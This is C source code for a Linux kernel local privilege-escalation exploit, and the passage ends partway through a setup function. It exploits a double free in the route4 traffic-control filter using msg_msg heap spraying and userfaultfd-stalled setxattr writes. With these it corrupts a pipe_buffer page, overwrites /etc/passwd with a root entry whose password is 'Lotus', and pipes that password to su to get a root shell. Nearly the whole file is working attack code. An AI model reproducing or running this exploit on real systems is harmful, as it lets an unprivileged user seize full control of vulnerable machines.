// $ gcc -static -pthread -O0 ./exploit.c -o ./exploit
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>


#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/timerfd.h>

#include <linux/tc_ematch/tc_em_meta.h>
#include <sys/resource.h>
#include <linux/userfaultfd.h>
#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/kcmp.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>

#include <x86intrin.h>
#include <err.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/utsname.h>




#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");


char *target = "/etc/passwd";                   // overwrite the target file
char *overwrite = "hi:x:0:0:root:/:/bin/sh\n";  // "user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n"
char *global;
char *self_path;
char *content;                                  // evil data + existing data in the target file

#define PAGE_SIZE 0x1000
#define MAX_FILE_NUM 0x8000
#define MSG_NUM 0x600
#define SOCKET_NUM 0x10
#define SK_BUFF_NUM 128
#define page_size 0x1000
#define PIPE_NUM 0x20

int cpu_cores = 0;      // num of cpu cores
int sockfd = -1;

int spray_num_1 = 2000; // 4000
int spray_num_2 = 4000; // 5000
static pthread_t monitor_thread;

int victim_idx;
int pipe_main[2];       // notify process to excecute using pipe
int pipe_parent[2];
int pipe_child[2];
int pipe_defrag[2];
int pipe_file_spray[2][2];
int msg_qid[MSG_NUM];
int msg_qid2[MSG_NUM];
size_t msg_buf[0x400];
size_t leak_data[0x1000/8];
int pipe_fd[PIPE_NUM][2];
size_t data_id = 0;
int target_file_fd;
char *page;

int ret=0;

int run_write = 0;      // let thread 2 begin to write evil data
int run_spray = 0;      // let thread 3 begin to spray privileged `file`
bool overlapped = false;

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

void errExit(char *s)
{
  puts(s);
  exit(-1);
}

struct list_head {
    size_t    next;
    size_t    prev;
};

struct msg_msg {
    struct list_head m_list;
    size_t    m_type;
    size_t    m_ts;
    size_t    next;
    size_t    security;
};

struct msg_msgseg {
    size_t    next;
};


// struct msgbuf {
//     long mtype;
//     char mtext[0];
// };

void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

static void *aa_free_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");
        char tmp_buf[0x200];
        puts("[7] Now in userfaultfd thread and we will get a double free again.");
        //any addr free
        if(msgrcv(msg_qid[victim_idx], tmp_buf, 144 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR)<0)
          errExit("[*]msgrcv!");
        

        if (fcntl(pipe_fd[2][1], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
            printf("[x] failed to extend pipe 2!\n");
            return ;
        }
    
        for (int i = 0x2; i < 0x3; i++) {
              size_t magic_num = 0x22220000+i;
              write(pipe_fd[i][1], &magic_num, 8);
              write(pipe_fd[i][1], "Lotus777", 8);
              // write(pipe_fd[i][1], &magic_num, sizeof(int));
              write(pipe_fd[i][1], &magic_num, sizeof(int));
              write(pipe_fd[i][1], "Lotus777", 8);
              write(pipe_fd[i][1], "Lotus777", 8);  /* prevent pipe_release() */
          }

        //what you should do something there

        page = malloc(0x1000);
        memset(page,0,0x1000);
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

static void *evil_write_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");
        char tmp_buf[0x200];
        puts("[8] Now in userfaultfd thread and we will edit the pipe_buffer->page to evil write into /etc/passwd.");

        char *data = ":$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
        printf("Setting root password to \"Lotus\"...\n");
        int data_size = strlen(data);

        //what we want to edit pipe->page


            int retval = write(pipe_fd[2][1], data,data_size);
                if (retval < 0)
                {
                    printf("Pipe_write failed!");
                    return;
                }
                else if (retval < data_size)
                    {
                        printf("Short pipe write!");
                    return;
                    }
        puts("[9] Free some kmalloc-192 to fix the freelist");
        for(int i=MSG_NUM-0X20;i<MSG_NUM-0x10;i++)
        {
          if(msgrcv(msg_qid[i], tmp_buf, 144 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR)<0)
          errExit("[*]msgrcv!");
        }


        GREEN puts("[*] Now the pwd is:"); CLOSE
        system("cat /etc/passwd");
        RED puts("You should use su and enter the passwd `Lotus` yourself."); CLOSE
        system("echo 'Lotus' | su -c sh");
        // char *cmd[] = {"/bin/sh", "-c", "(echo Lotus; cat) | su - -c \""
        //             "echo \\\"Done! Popping shell... (run commands now)\\\";"
        //             "/bin/sh;"
        //         "\" root"};

        // execv("/bin/sh", cmd);
        

        page = malloc(0x1000);
        memset(page,0,0x1000);
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        return NULL;
    }
}

int getMsgQueue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void buildMsg(struct msg_msg *msg, size_t m_list_next, size_t m_list_prev, 
              size_t m_type, size_t m_ts,  size_t next, size_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

// set cpu affinity
void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}



void setup_namespace() {
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (unshare(CLONE_NEWNET) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (!write_file("/proc/self/setgroups", "deny")) {
    perror("[-] write_file(/proc/self/set_groups)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
    perror("[-] write_file(/proc/self/uid_map)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
    perror("[-] write_file(/proc/self/gid_map)");
    exit(EXIT_FAILURE);
  }
}



// set up process memory / working dir / namespace
void pre_exploit() {
  setup_namespace();
  target_file_fd = open("/etc/passwd",0);
  if(target_file_fd<0)
  {
    errExit("open pwd file error!");
  }
}

#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
// add attribute
int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr *)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) 
    memcpy(RTA_DATA(attr), data, len);

  return RTA_LENGTH(len);
}
// add attribute (maxlen limitation)
int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data, int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}
// add_qdisc() —— setup the socket
int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc                                          nlmsghdr + tcmsg
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);       // sfq is not defaully configured, only qfq is configured
  // print_hex(msg, msg->nlmsg_len);

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}
// spray 1 vulnerable object (filter) with customized flags
int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle, u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;                               // RTM_NEWTFILTER
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);              // TCA_ROUTE4_FROM
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);                  // TCA_ROUTE4_TO
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);
  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle << 8) + handle, flag);
}

uint32_t calc_handle(uint32_t from, uint32_t to) {
  uint32_t handle = to;

  assert(from <= 0xff && to <= 0xff);
  handle |= from << 16;

  if (((handle & 0x7f00) | handle) != handle)
    return 0;

  if (handle == 0 || (handle & 0x8000))
    return 0;
  return handle;
}

void *delete_tc_(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // delete filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;                                   // RTM_DELTFILTER
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr))
    printf("[-] size of sender address is wrong\n");
  return start;
}

void delete_tc(int sockfd, uint32_t handle) {
  delete_tc_(sockfd, ((handle) << 8) + (handle));
}

// spray spray_count objects ???
int add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len, int spray_count) {
  assert(spray_len * spray_count < 0x3000);
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter                      nlmsghdr + tcmsg
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;                               // RTM_NEWTFILTER
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x4000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);
  struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);
  struct tcf_ematch_tree_hdr tree_hdr = {.nmatches = spray_count / 2,
                                         .progid = 0};

  addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &tree_hdr, sizeof(tree_hdr));
  struct rtattr *rt_match_tail = addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);

  char *data = malloc(0x3000);
  for (int i = 0; i < tree_hdr.nmatches; i++) {
    char *current;
    memset(data, 0, 0x3000);
    struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;
    hdr->kind = TCF_EM_META;
    hdr->flags = TCF_EM_REL_AND;

    current = data + sizeof(*hdr);

    struct tcf_meta_hdr meta_hdr = {
        .left.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
        .right.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
    };

    current += addattr(current, TCA_EM_META_HDR, &meta_hdr, sizeof(hdr));
    current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);
    current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);

    addattr_l(msg, 0x4000, i + 1, data, current - data);
  }

  addattr_nest_end(msg, rt_match_tail);
  addattr_nest_end(msg, ema_tail);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  sendmsg(fd, &msgh, 0);
  free(data);
  free(start);
  return 1;
}

void *delete_tc_basic(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // delete filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;                           // RTM_DELTFILTER
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x1000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr))
    printf("[-] size of sender address is wrong\n");

  return start;
}

size_t find_page_addr(size_t *data)
        {
          puts("[6] Search pwd->page...");
          for(int i=0;i<0xf00/8;i++)
          {
            if(data[i]>0xffff000000000000&&data[i+1]==0x100000000&&data[i+2]>0xffffffff81000000&&data[i+3]==0&&data[i+4]==0&&data[i]!=0xffffffffffffffff)
            {
              GREEN printf("[*] Found the addr of the pwd->page:0x%lx\n",data[i]); CLOSE
              return i;
            }
          }
          return 0;
        }

char *uffd_buf_evil_write= NULL;
char *uffd_buf_free= NULL;

void exploit() {
  char msg[0x10] = {};
  

  pin_on_cpu(0);
  printf("[*] starting exploit, num of cores: %d\n", cpu_cores);
  
  uffd_buf_free = (char*) mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  registerUserFaultFd(uffd_buf_free + page_size, page_size, aa_free_thread);

  uffd_buf_evil_write = (char*) mmap(NULL, page_size * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  registerUserFaultFd(uffd_buf_evil_write + page_size, page_size, evil_write_thread);


  printf("[0] allocate some pipe and init those.\n");

  for(int i=0;i<PIPE_NUM;i++)
  {
    if(pipe(pipe_fd[i])<0)
    {
        errExit("alloc pipe error!");
    }
  }

  // open & setup the socket
  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);  
// 2. allocate a route4_filter (vulnerable object)
  if (read(pipe_child[0], msg, 2) != 2) 
    err(1, "[-] read from parent");
  printf("[1] allocate the vulnerable filter\n");


  for (int i = 0; i < MSG_NUM; i++)
    {
        msg_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (msg_qid[i] < 0)
        {
            puts("[x] msgget!");
            return -1;
        }
    }

  if (fcntl(pipe_fd[0][1], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
            printf("[x] failed to extend pipe 0!\n");
            return -1;
        }
    //alloc for kfree in the last to fix the freelist of kmalloc-192
   for (int i = MSG_NUM-0X20; i < MSG_NUM-0X10; i++)
    {
        memset(msg_buf, 'D', 0X1100 - 8);
        msg_buf[0] = 0xeeee0000+i;

        ret = msgsnd(msg_qid[i], msg_buf, 144-0x30, 0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msg!");
            return;
        } 
    }

    
  usleep(500 * 1000);
  
  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);  // handle = 0 


//   add_tc_(sockfd, 1, 1, 1, NLM_F_EXCL | NLM_F_CREATE);  // handle = 1

  usleep(500 * 1000);

  printf("[2] edit some of the pipe_buffer to the kmalloc-192 to leak pipe_buffer->page\n");

    if (fcntl(pipe_fd[1][1], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
            printf("[x] failed to extend pipe 1!\n");
            return -1;
        }
    
  for (int i = 0; i < 0x2; i++) {
        size_t magic_num = 0x22220000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "Lotus777", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], "Lotus777", 8);  /* prevent pipe_release() */
    }
    for (int i = 0; i < 2; i++) {
        size_t offset_in_file = 0;
        ret = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (ret<0)
        {
            printf("splice failed:%d!",i);
            return -1;
        }
		    
	    else if (ret == 0)
        {
            printf("short splice:%d!",i);
            return -1;
        }    
    }

  usleep(1000 * 1000);
    //0xffff88800744aa80
    //0xffff888006282a80

  // free the object, to free the slab
  printf("[3] 1st freed the filter object\n");

  add_tc_(sockfd, 0x11, 0x12, 0, NLM_F_CREATE);         // handle = 0
//   add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);

  // wait for the vulnerable object being freed
  usleep(500 * 1000);
  if (write(pipe_parent[1], "OK", 2) != 2)
    err(1, "[-] write to child");
// 7. spray msg_msg
  if (read(pipe_child[0], msg, 2) != 2)
    err(1, "[-] read from parent");

  usleep(1000 * 1000);

    
// b *0xffffffff814734ba
    // sleep(1000);
  getchar();
// 9. 2nd free route4_filter, which will free the file
  printf("[4] 2nd free the filter object\n");
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);         // handle = 0
  // sleep(10000);
  usleep(1000 * 1000);   // should not sleep too long, otherwise file might be claimed by others

  // sleep(10);

  //b *0xffffffff814734b5 <load_msg+133>    call   __kmalloc
  int i;
  printf("[5] spray 192 msg_msg and 192 msgseg to overlapping.\n");
    for (i = 2; i < MSG_NUM; i++)
    {
        memset(msg_buf, 'C', 0X1100 - 8);
        msg_buf[0] = 0xeeee0000+i;
        int idx=(0x1008-0x30)/8;
        msg_buf[idx++] = 0xeeee0000+i;//list_node->prev
        msg_buf[idx++] = 0xdeadbeefdeadbeef;//mtype
        msg_buf[idx++] = 0xf00;//m_ts
        msg_buf[idx++] = 0;//next
        msg_buf[idx++] = 0;//security

        

        ret = msgsnd(msg_qid[i], msg_buf, 144-0x30, 0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msg!");
            return;
        }

        ret = msgsnd(msg_qid[i+1],msg_buf,0x1000+144-0x30-0x8,0);
        if (ret < 0)
        {
            puts("[x] msgsnd for msg_msgseg!");
            return;
        }
        


        ret = peekMsg(msg_qid[i],&leak_data,0xf00,0);
        if(ret<0)
        {
          errExit("MSG_COPY error!");
        }
        else if(ret>144)
        {
        //   print_hex(leak_data,0xf00);
          data_id = find_page_addr(&leak_data);
          ret = msgrcv(msg_qid[i+1], msg_buf, 0x1000+144 - 0x30-0x8, 0, IPC_NOWAIT | MSG_NOERROR);
          if(ret<0)
          {
            errExit("[*]msgrcv!");
          }
          break;
        }
        else
        {
          ret = msgrcv(msg_qid[i+1], msg_buf, 0x1000+144 - 0x30-0x8, 0, IPC_NOWAIT | MSG_NOERROR);
          if(ret<0)
          {
            errExit("[*]msgrcv!");
          }
        }
        
        //unlink
        // list->next->prev = list->prev
        // list->prev->next = list->next

        // if(i%0x10==0)
        // {
        //   printf("do_msg:0x%x\n",i);
        // }
        
    }
    if(!data_id)
    {
      errExit("Not found the addr of pwd->page.");
    }

    victim_idx = i;
    

    *(size_t *)(uffd_buf_free + page_size - 0x30) = leak_data[data_id]+0x1000;
        *(size_t *)(uffd_buf_free + page_size - 0x28) = leak_data[data_id]+0x1000;
        *(size_t *)(uffd_buf_free + page_size - 0x20) = 0xdeadbeefdeadbeef;
        *(size_t *)(uffd_buf_free + page_size - 0x18) = 0x800;
        *(size_t *)(uffd_buf_free + page_size - 0x10) = 0;
        *(size_t *)(uffd_buf_free + page_size - 0x8) = 0;

        setxattr("/exp", "Lotus", uffd_buf_free + page_size - 0x30, 144, 0);
  
        

       
        *(size_t *)(uffd_buf_evil_write + page_size - 0x28) = leak_data[data_id];
        *(size_t *)(uffd_buf_evil_write + page_size - 0x20) = 0x400000000;
        *(size_t *)(uffd_buf_evil_write + page_size - 0x18) = leak_data[data_id-3];
        *(size_t *)(uffd_buf_evil_write + page_size - 0x10) = 0x10;
        *(size_t *)(uffd_buf_evil_write + page_size - 0x8) = 0;

        setxattr("/exp", "Lotus", uffd_buf_evil_write + page_size - 0x28, 144, 0);

        RED puts("Never get there!"); CLOSE

  

}


int run_exp() {
// 0. initialize pipe as notifier
  if (pipe(pipe_parent) == -1)
    err(1, "[-] fail to create pipes\n");
  if (pipe(pipe_child) == -1)
    err(1, "[-] fail to create pipes\n");
  if (pipe(pipe_defrag) == -1)
    err(1, "[-] fail to create pipes\n");
  if (pipe(pipe_file_spray[0]) == -1)   // begin spray file
    err(1, "[-] fail to create pipes\n");
